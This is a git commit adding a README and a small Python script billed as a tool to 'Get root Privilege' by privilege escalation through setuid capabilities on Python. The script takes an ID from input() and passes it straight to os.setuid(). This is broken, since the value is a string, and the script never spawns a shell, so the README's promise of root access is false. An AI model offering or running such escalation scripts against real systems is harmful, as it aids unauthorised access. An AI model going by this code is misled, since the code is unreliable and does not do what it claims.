3cdb2298b6013f6bb1aaa3b4ce4f4a0d4f86f1c0
An335h <aneeshad2.com>
2021-06-14 09:49:25 +0530

    added a python tool to setuid

---
+++ Python/SETUID_python/README.md
@@ -0,0 +1,12 @@
+# Get root Privilege in user terminal
+# Privilege-escalation-via-setuid only if you have setuid capabilities on python.
+
+## Introduction
+```
+This is a python tool which reset the setuid to the any id you want
+
+```
+## How to use it :
+1. Download or clone the repository
+2. Run setuid.py
+3. Give the UID
---
+++ Python/SETUID_python/setuid.py
@@ -0,0 +1,24 @@
+
+# importing os module
+import os
+
+# Get the real user ID
+# of the current process
+# using os.getuid() method
+uid = os.getuid()
+
+# Print the real user ID
+# of the current process
+print("Real user ID of the current process:", uid)
+
+# Set real user ID
+# of the current process
+# using os.setuid() method
+uid = input("Enter the id: ")
+os.setuid(uid)
+print("Real user ID changed")
+
+
+# Print the real user ID
+# of the current process
+print("Real user ID of the current process:", os.getuid())
